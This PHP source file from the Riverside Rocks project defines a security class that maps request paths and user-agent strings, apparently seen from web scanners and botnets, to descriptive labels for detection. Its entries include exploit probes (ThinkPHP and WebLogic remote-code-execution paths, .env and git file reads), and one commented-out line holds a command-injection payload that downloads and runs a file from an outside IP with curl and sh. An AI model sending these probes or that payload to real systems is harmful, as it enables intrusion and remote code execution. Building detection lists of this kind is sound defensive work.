<?php
/*
   +----------------------------------------------------------------------+
   | Copyright (c) 2020 Trent Wiles and the Riverside Rocks authors       |
   +----------------------------------------------------------------------+
   | This source file is subject to the Apache 2.0 Lisence.               |
   |                                                                      |
   | If you did not receive a copy of the license and are unable to       |
   | obtain it through the world-wide-web, please send a email to         |
   | support@riverside.rocks so we can mail you a copy immediately.       |
   +----------------------------------------------------------------------+
   | Authors: Trent "Riverside Rocks" Wiles <trent@riverside.rocks>       |
   +----------------------------------------------------------------------+
*/

namespace RiversideRocks;

class security
{
    public function returnExploits()
    {
        $exploits = array(
                "/.env" => "Tried to access .env file",
                "/api/jsonws/invoke" => "Tried to POST web API, /api/jsonws/invoke",
                "/.git//index" => "Attempted to access git files, /.git//index",
                "/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" => "ThinkPHP exploit. /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>",
                "/?XDEBUG_SESSION_START=phpstorm" => "PHPSTORM Debug hack",
                "/solr/admin/info/system?wt=json" => "Trying to access solr admin page.",
                "/boaform/admin/formLogin" => "Trying to access admin login: /boaform/admin/formLogin",
                "/config/getuser?index=0" => "Trying to access configuration files: /config/getuser?index=0",
                "/test/.env" => "Attempting to access .env file",
                "/laravel/.env" => "Attempting to access .env file",
                "/admin/.env" => "Attempting to access .env file",
                "/system/.env" => "Attempting to access .env file",
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" => "Attempting to access vendor files: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "/por/login_psw.csp" => "Trying to access admin login pages: /por/login_psw.csp",
                "/ui/login.php" => "Trying to access admin login pages: /ui/login.php",
                "/cgi-bin/login.cgi?requestname=2&cmd=0" => "Trying to access admin login pages: /cgi-bin/login.cgi?requestname=2&cmd=0",
                "/GponForm/diag_Form?images/" => "Odd Request, trying to access some sort of form: /GponForm/diag_Form?images/",
                "//vendor/phpunit/phpunit/phpunit.xsd" => "Trying to access PHPUnit scripts: //vendor/phpunit/phpunit/phpunit.xsd",
                "//web/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
                "//wordpress/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
                "//wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
                "//shop/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
                "//cms/wp-includes/wlwmanifest.xml" => "Attempting to access Wordpress wlwmanifest.xml file.",
                "//xmlrpc.php?rsd" => "Suspicous request; //xmlrpc.php?rsd",
                "/manager/text/list" => "Trying to access admin files: /manager/text/list",
                "/boaform/admin/formLogin?username=ec8&psd=ec8" => "Trying to access admin login: /boaform/admin/formLogin",
                "/phpMyAdmin/scripts/setup.php" => "Trying to access phpMyAdmin page.",
                "/TP/public/index.php" => "Tried ThinkPHP Exploit",
                "/phpmyadmin/" => "Tried to access phpMyAdmin page",
                "/clientaccesspolicy.xml" => "Bad web bot, ignores robots.txt",
                "/connector.sds" => "Scanning for vulns, GET /connector.sds",
                "/hudson" => "Scanning for vulns, GET /hudson",
                "/wp-includes/js/jquery/jquery.js" => "Searching for vulns, GET /wp-includes/js/jquery/jquery.js",
                "/webfig/" => "GET /webfig/",
                "/editBlackAndWhiteList" => "GET /editBlackAndWhiteList",
                "/boaform/admin/formLogin?username=adminisp&psd=adminisp" => "Searching for login pages",
                "/wp-admin" => "Looking for wordpress exploits",
                "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP" => "ThinkPHP exploit",
                "/wp-content/plugins/wp-file-manager/readme.txt" => "Searching for Wordpress file manager",
                "/wp/wp-admin/" => "Looking for wordpress admin",
                "/wp-admin/" => "Looking for wordpress admin",
                "/html/public/index.php" => "Looking for framework vulnurabilities",
                "/ab2h" => "Scanning",
                "/solr/" => "Searching for login pages",
                "//sito/wp-includes/wlwmanifest.xml" => "Searching for wordpress files",
                "/PHPMYADMIN/scripts/setup.php" => "phpMyAdmin exploits",
                "/wp-login.php" => "Trying to access wordpress admin page",
                "/wp-config.php" => "Trying to access wordpress files",
                "/ctrlt/DeviceUpgrade_1" => "Router exploit",
                "/nice%20ports%2C/Tri%6Eity.txt%2ebak" => "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak",
                "/wls-wsat/CoordinatorPortType11" => "Oracle WebLogic server Remote Code Execution vulnerability.",
                "/_async/AsyncResponseService" => "Oracle WebLogic server Remote Code Execution vulnerability.",
                "/webmail/VERSION" => "GET /webmail/VERSION",
                "/mail/VERSION" => "GET /mail/VERSION",
                "/afterlogic/VERSION" => "GET /afterlogic/VERSION",
                "/joomla/" => "Searching for Joomla",
                "/shell.php" => "Probing, /shell.php",
                "/desktop.ini.php" => "Probing, /desktop.ini.php",
                "/_fragment" => "GET /_fragment (Symphony Remote Code Execution)",
                "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" => "Probing for wordpress vulns",
                "/HNAP1/" => "Searching for router login page",
                "/portal/redlion" => "Probing",
                "/cgi-bin/login.cgi?requestname=2&cmd=0" => "Attempting to hack login page",
                "/ui/login.php" => "Attempting to access login pages",
                "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media" => "Searching for fckeditor upload page",
                "/vendor/phpunit/phpunit/build.xml" => "Searching for PHPUnit",
                "/js/header-rollup-554.js" => "Probing for javascript",
                "/images/editor/separator.gif" => "Probing for editor",
                "/admin/includes/general.js" => "Trying to detect admin page",
                "/admin/view/javascript/common.js" => "Trying to detect admin page",
                "/misc/ajax.js" => "GET /misc/ajax.js",
                "/administrator/help/en-GB/toc.json" => "Probing for admin page",
                "/wp-content/plugins/apikey/f0x.php" => "Probing for wordpress API keys",
                "/wp-content/plugins/apikey/apikey.php" => "Probing for wordpress API keys",
                "/sql/index.php" => "Probing for sql admin pages.",
                "/MySQLAdmin/index.php" => "Probing for sql admin pages.",
                "/shopdb/index.php" => "Probing for sql admin pages.",
                "/phpiMyAdmin/index.php" => "Probing for sql admin pages.",
                "/phpiMyAdmin/index.php" => "Probing for sql admin pages.",
                "/phpMyAdmina/index.php" => "Probing for sql admin pages.",
                "/vendor/phpunit/phpunit/LICENSE" => "Searching for PHPUnit",
                "/xmlrpc.php" => "/xmlrpc.php",
                "/php.ini" => "Searching for PHP",
                "/ErKNDtwEzynKq/index.php" => "Probing for PHP based exploits",
                "/duck.php" => "Probing for PHP based exploits",
                "/sysadmin.php" => "Probing for PHP based exploits",
                "/secret.php" => "Probing: /secret.php",
                "/.config" => "Searching for config files",
                "/.local" => "Searching for config files",
                "/console/" => "Searching for webshells",
                "/currentsetting.htm" => "Netgear config page",
                "/status?full&json" => "Searching for server status pages",
                "/server-status?format=plain" => "Searching for server status pages",
                "/admin/api.php?version" => "Searching for admin pages",
                //"/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22" => "Remote code execution",
                "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media" => "Attempt to upload assets",
                "/admin/view/javascript/common.js" => "Searching for admin pages",
                "/boaform/admin/formPing" => "Wifi Router exploit (likley botnet)",
                "/web_shell_cmd.gch" => "Searching for webshells",
                "/.well-known/security.txt" => "/.well-known/security.txt",
                "/new/" => "Wordpress hacks",
                "/blog/" => "Wordpress hacks",
                "/2019/" => "Wordpress hacks",
                "/2020/" => "Wordpress hacks",
                "/wp-json" => "Searching for wordpress exploits",
                "/wp-config.php.save" => "Wordpress exploits",
                //"/level/15/exec/-/sh/run/CR" => "/level/15/exec/-/sh/run/CR",
                "/NonExistence" => "/NonExistence",
                "/.git/HEAD" => "Attempting to access git folder",
                "/y000000000000.cfg" => "Searching for config files",
                //"/index.php/module/action/param1/${@die(sha1(xyzt))}" => "Remote code injection",
                "/volume1/web/webapi/query.cgi" => "/volume1/web/webapi/query.cgi",
                "//mysql/scripts/setup.php" => "Searching for phpMyAdmin",
                "//sql/sql/scripts/setup.php" => "Searching for phpMyAdmin",
                "/index.htm" => "GET /index.htm",
                "/wp2/wp-includes/wlwmanifest.xml" => "Wordpress scan",
                //"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash" => "Command Injections",
                "/wp-content/plugins/angwp/package.json" => "Wordpress scan",
                "/owa/auth/logon.aspx" => "Searching for outlook admin page",
                "/autodiscover/autodiscover.xml" => "GET /autodiscover/autodiscover.xml",
                "/wp-config.good" => "Wordpress exploits",
                "/js/mage/cookies.js" => "/js/mage/cookies.js"
        );

            return $exploits;
    }
    public function userAgents()
    {
        $agents = array(
            "Mozilla/5.0" => "Port Scanner",
            "curl/7.58.0" => "Scanning for exploits",
            "Hello, world" => "Mozi Botnet",
            "polaris botnet" => "Polaris Botnet"
        );
        return $agents;
    }
}
